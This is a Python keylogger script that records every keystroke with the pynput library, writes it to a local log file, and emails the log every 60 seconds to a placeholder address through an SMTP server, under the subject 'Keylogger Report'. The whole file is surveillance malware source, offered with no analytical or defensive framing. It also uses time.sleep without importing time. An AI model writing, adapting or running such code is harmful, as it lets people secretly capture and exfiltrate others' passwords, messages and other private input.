import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

LOG_FILE = "keystrokes.log"

def send_email(log_content):
    try:
        from_addr = "your_email@example.com"
        to_addr = "recipient@example.com"
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = "Keylogger Report"
        
        body = MIMEText(log_content, 'plain')
        msg.attach(body)

        server = smtplib.SMTP('smtp.example.com', 587)  # Replace with your SMTP server
        server.starttls()
        server.login(from_addr, "your_password")  # Use an app-specific password if needed
        text = msg.as_string()
        server.sendmail(from_addr, to_addr, text)
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def on_key_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char'):
                log_file.write(key.char)
            else:
                log_file.write(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

def send_log_periodically():
    try:
        with open(LOG_FILE, "r") as log_file:
            content = log_file.read()
            send_email(content)
    except Exception as e:
        print(f"Error reading log file: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    while True:
        time.sleep(60)  # Send log every 60 seconds
        send_log_periodically()
